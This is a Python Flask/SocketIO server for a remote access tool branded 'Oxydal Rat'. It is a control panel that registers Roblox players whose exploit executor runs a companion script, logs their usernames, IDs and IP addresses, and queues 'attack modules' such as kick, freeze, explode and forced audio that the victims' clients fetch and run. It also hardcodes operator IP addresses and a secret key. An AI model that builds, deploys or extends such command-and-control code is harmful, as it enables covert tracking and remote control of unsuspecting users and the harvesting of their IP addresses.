from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO, emit
import time
import eventlet
from datetime import datetime

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "cyber_key_999"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# CONFIGURATION
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_commands = {}
history_logs = [] 

def add_to_history(action, p_data):
    # p_data contient toutes les infos du joueur pour un historique riche
    log = {
        "id": str(time.time()),
        "time": datetime.now().strftime("%H:%M:%S"),
        "user": p_data.get("username", "Inconnu"),
        "userid": p_data.get("userid", "0"),
        "ip": p_data.get("ip", "0.0.0.0"),
        "executor": p_data.get("executor", "N/A"),
        "gameName": p_data.get("gameName", "Jeu"),
        "gameId": p_data.get("gameId", "0"),
        "action": action
    }
    history_logs.insert(0, log)
    if len(history_logs) > 100: history_logs.pop()
    socketio.emit("update_history", history_logs)

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip: ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS: abort(403)

HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
<style>
    :root {
        --bg: #050505;
        --card-bg: rgba(20, 20, 25, 0.8);
        --accent: #00f2ff;
        --accent-glow: rgba(0, 242, 255, 0.5);
        --danger: #ff0055;
        --warning: #ffcc00;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { 
        font-family: 'Rajdhani', sans-serif; 
        background: var(--bg); 
        color: #fff; 
        overflow-x: hidden;
        background-image: radial-gradient(circle at 50% 0%, #102030 0%, #050505 70%);
    }

    /* Animations */
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes pulse { 0% { box-shadow: 0 0 5px var(--accent); } 50% { box-shadow: 0 0 20px var(--accent); } 100% { box-shadow: 0 0 5px var(--accent); } }

    .container { max-width: 1600px; margin: auto; padding: 40px; animation: fadeIn 0.8s ease-out; }
    
    h1 { 
        font-family: 'Orbitron'; font-size: 3.5rem; text-align: center; margin-bottom: 50px;
        background: linear-gradient(to bottom, #fff, var(--accent));
        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        filter: drop-shadow(0 0 15px var(--accent-glow));
    }

    .main-layout { display: grid; grid-template-columns: 1fr 450px; gap: 40px; }

    /* Glassmorphism Cards */
    .card { 
        background: var(--card-bg); 
        border: 1px solid rgba(255, 255, 255, 0.1); 
        border-radius: 20px; padding: 25px; 
        backdrop-filter: blur(10px);
        position: relative; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    .card:hover { transform: scale(1.02); border-color: var(--accent); box-shadow: 0 10px 30px rgba(0, 242, 255, 0.2); }

    .trash-player { 
        position: absolute; top: 20px; right: 20px; background: none; border: none; 
        color: #444; cursor: pointer; font-size: 1.4rem; transition: 0.3s; 
    }
    .trash-player:hover { color: var(--danger); transform: rotate(15deg); }

    .status-badge { 
        display: inline-flex; align-items: center; padding: 5px 12px; border-radius: 20px; 
        font-size: 0.8rem; font-weight: bold; background: rgba(0,0,0,0.5); margin-bottom: 15px;
    }
    .dot { width: 8px; height: 8px; border-radius: 50%; margin-right: 8px; }
    .online { background: var(--accent); animation: pulse 2s infinite; }

    .name a { 
        font-family: 'Orbitron'; font-size: 1.5rem; color: var(--warning); 
        text-decoration: none; transition: 0.3s; 
    }
    .name a:hover { text-shadow: 0 0 10px var(--warning); }

    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; font-size: 0.9rem; color: #aaa; }
    .info-grid b { color: #fff; }

    /* Buttons Style */
    .btn-group { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 15px; }
    .btn { 
        padding: 12px; border: none; border-radius: 8px; cursor: pointer; 
        font-weight: bold; font-family: 'Rajdhani'; font-size: 0.9rem; text-transform: uppercase;
        color: white; transition: 0.3s; position: relative; overflow: hidden;
    }
    .btn::after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition: 0.5s; }
    .btn:hover::after { left: 100%; }
    .btn:active { transform: scale(0.95); }

    .btn-troll { background: linear-gradient(135deg, #12c2e9, #c471ed, #f64f59); }
    .btn-undo { background: #222; border: 1px solid #444; }
    .btn-undo:hover { background: #333; }

    /* History Panel */
    .history-panel { 
        background: rgba(10, 10, 15, 0.9); border: 1px solid rgba(255,255,255,0.05); 
        border-radius: 24px; padding: 25px; height: 800px; display: flex; flex-direction: column; 
    }
    .history-list { flex-grow: 1; overflow-y: auto; padding-right: 10px; }
    .history-list::-webkit-scrollbar { width: 5px; }
    .history-list::-webkit-scrollbar-thumb { background: var(--accent); border-radius: 10px; }

    .history-item { 
        padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.05); 
        font-size: 0.85rem; line-height: 1.5; transition: 0.2s;
    }
    .history-item:hover { background: rgba(255,255,255,0.02); }
    .hist-time { color: var(--accent); font-family: monospace; }
    .hist-main { display: block; margin: 5px 0; font-weight: bold; font-size: 0.95rem; }
    .hist-details { color: #777; font-size: 0.8rem; display: block; }
    .hist-details a { color: var(--accent); text-decoration: none; }

    /* Modals */
    .modal { 
        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
        background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 1000; align-items: center; justify-content: center;
    }
    .modal.active { display: flex; }
    .modal-content { 
        background: #111; padding: 40px; border-radius: 24px; border: 1px solid var(--accent); 
        width: 400px; text-align: center; box-shadow: 0 0 50px rgba(0, 242, 255, 0.2);
    }
    .modal-content input { 
        width: 100%; padding: 15px; background: #1a1a1a; border: 1px solid #333; 
        color: white; border-radius: 10px; margin: 20px 0; font-family: 'Rajdhani';
    }
</style>
</head>
<body>

<div class="container">
    <h1>NEON CONTROL</h1>
    
    <div class="main-layout">
        <section>
            <h2 style="color: var(--accent); margin-bottom: 25px; font-family: 'Orbitron'; font-size: 1rem; letter-spacing: 2px;">ACTIVE_OPERATIVES</h2>
            <div class="grid" id="players"></div>
        </section>

        <aside>
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 25px;">
                <h2 style="color: var(--accent); font-family: 'Orbitron'; font-size: 1rem; letter-spacing: 2px;">MISSION_LOGS</h2>
                <button onclick="clearHistory()" style="background:none; border:none; color: var(--danger); cursor:pointer; font-weight:bold; font-size:0.7rem;">[ PURGE ]</button>
            </div>
            <div class="history-panel">
                <div class="history-list" id="history-list"></div>
            </div>
        </aside>
    </div>
</div>

<div class="modal" id="kickModal">
    <div class="modal-content">
        <h2 style="color:var(--danger)">TERMINATE SESSION</h2>
        <input type="text" id="kickReason" placeholder="Reason for termination...">
        <div style="display:flex; gap:10px">
            <button class="btn" style="flex:1; background:#333" onclick="closeModal('kickModal')">Abort</button>
            <button class="btn" style="flex:1; background:var(--danger)" id="confirmKickBtn">Confirm</button>
        </div>
    </div>
</div>

<div class="modal" id="soundModal">
    <div class="modal-content">
        <h2 style="color:var(--accent)">BROADCAST AUDIO</h2>
        <input type="text" id="soundAssetId" placeholder="Audio Asset ID">
        <div style="display:flex; gap:10px">
            <button class="btn" style="flex:1; background:#333" onclick="closeModal('soundModal')">Abort</button>
            <button class="btn" style="flex:1; background:var(--accent)" id="confirmSoundBtn">Transmit</button>
        </div>
    </div>
</div>

<script>
const socket = io();
let selectedUid = null;

function openKickModal(uid) { selectedUid = uid; document.getElementById('kickModal').classList.add('active'); }
function openSoundModal(uid) { selectedUid = uid; document.getElementById('soundModal').classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); selectedUid = null; }

function sendTroll(uid, cmd, assetId = null) {
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: uid, cmd: cmd, assetId: assetId})});
}

function deletePlayer(uid) { fetch("/delete_player", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: uid})}); }
function clearHistory() { fetch("/clear_history", {method: "POST"}); }
function deleteLog(id) { fetch("/clear_history", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({log_id: id})}); }

document.getElementById('confirmKickBtn').onclick = () => {
    sendTroll(selectedUid, 'kick', document.getElementById('kickReason').value || "Terminated by Admin");
    closeModal('kickModal');
};
document.getElementById('confirmSoundBtn').onclick = () => {
    sendTroll(selectedUid, 'playsound', document.getElementById('soundAssetId').value);
    closeModal('soundModal');
};

socket.on("update", (data) => {
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));

    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) {
            card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card);
        }
        card.innerHTML = `
            <button class="trash-player" onclick="deletePlayer('${id}')">🗑</button>
            <div class="status-badge"><div class="dot ${p.online ? 'online' : ''}"></div>${p.online ? 'ACTIVE' : 'IDLE'}</div>
            <div class="name"><a href="https://www.roblox.com/fr/users/${id}/profile" target="_blank">${p.username}</a></div>
            
            <div class="info-grid">
                <div><b>IP:</b> ${p.ip}</div>
                <div><b>EXEC:</b> ${p.executor}</div>
                <div style="grid-column: span 2"><b>MISSION:</b> <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.gameName}</a></div>
            </div>

            <div style="color:var(--accent); font-size:0.7rem; letter-spacing:1px; margin-bottom:10px">ATTACK_MODULES</div>
            <div class="btn-group">
                <button class="btn btn-troll" onclick="openKickModal('${id}')">KICK</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="btn btn-troll" style="grid-column: span 2; background:orange" onclick="openSoundModal('${id}')">PLAY AUDIO</button>
            </div>

            <div style="color:#555; font-size:0.7rem; letter-spacing:1px; margin:15px 0 10px">RECOVERY_MODULES</div>
            <div class="btn-group">
                <button class="btn btn-undo" onclick="sendTroll('${id}','unfreeze')">DEFROST</button>
                <button class="btn btn-undo" onclick="sendTroll('${id}','unspin')">STABILIZE</button>
                <button class="btn btn-undo" onclick="sendTroll('${id}','stopsound')">MUTE</button>
                <button class="btn btn-undo" onclick="sendTroll('${id}','unrainbow')">RESTORE</button>
            </div>
        `;
    });
    document.querySelectorAll('.card').forEach(c => { if (!currentIds.has(c.id.replace('card_', ''))) c.remove(); });
});

socket.on("update_history", (logs) => {
    const list = document.getElementById("history-list");
    list.innerHTML = logs.map(log => `
        <div class="history-item">
            <div style="display:flex; justify-content:space-between">
                <span class="hist-time">[${log.time}]</span>
                <span onclick="deleteLog('${log.id}')" style="cursor:pointer; color:#444">✕</span>
            </div>
            <span class="hist-main">${log.user} <span style="color:#555">(${log.ip})</span></span>
            <span class="hist-details">
                Action: <b style="color:var(--accent)">${log.action.toUpperCase()}</b><br>
                Game: <a href="https://www.roblox.com/fr/games/${log.gameId}" target="_blank">${log.gameName}</a> | Exec: ${log.executor}
            </span>
        </div>
    `).join('');
});
</script>
</body>
</html>"""

@app.route("/")
def index():
    check_ip()
    return render_template_string(HTML)

@socketio.on('connect')
def handle_connect():
    emit("update_history", history_logs)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        d = request.get_json(silent=True) or {}
        uid = str(d.get("userid", ""))
        if d.get("action") == "register" and uid:
            d["userid"] = uid
            if uid not in connected_players:
                add_to_history("Connexion", d)
            connected_players[uid] = {
                "username": d.get("username", "Unknown"),
                "ip": d.get("ip", "Unknown"),
                "gameName": d.get("gameName", "Click to view"),
                "gameId": d.get("gameId", "0"),
                "executor": d.get("executor", "Unknown"),
                "last": now, "online": True
            }
        elif d.get("action") == "heartbeat" and uid in connected_players:
            connected_players[uid]["last"] = now
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if uid in pending_commands:
            return jsonify(pending_commands.pop(uid))
        return jsonify({})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    d = request.get_json()
    uid, cmd = str(d["userid"]), d["cmd"]
    assetId = d.get("assetId")
    pending_commands[uid] = {"command": cmd, "assetId": assetId} if assetId else {"command": cmd}
    
    p_data = connected_players.get(uid, {"username": "Unknown"})
    add_to_history(f"Cmd: {cmd}", p_data)
    return jsonify({"sent": True})

@app.route("/delete_player", methods=["POST"])
def delete_player():
    check_ip()
    uid = str(request.get_json()["userid"])
    if uid in connected_players:
        add_to_history("Panel: Delete", connected_players[uid])
        del connected_players[uid]
    return jsonify({"ok": True})

@app.route("/clear_history", methods=["POST"])
def clear_history():
    check_ip()
    global history_logs
    data = request.get_json(silent=True)
    if data and "log_id" in data:
        history_logs = [l for l in history_logs if l["id"] != data["log_id"]]
    else:
        history_logs.clear()
    socketio.emit("update_history", history_logs)
    return jsonify({"ok": True})

def broadcast_loop():
    while True:
        now = time.time()
        to_remove = []
        for uid, p in connected_players.items():
            p["online"] = (now - p["last"] < 15)
            if now - p["last"] > 60: to_remove.append(uid)
        for uid in to_remove:
            add_to_history("Déconnexion (Timeout)", connected_players[uid])
            del connected_players[uid]
        socketio.emit("update", {"players": connected_players})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)

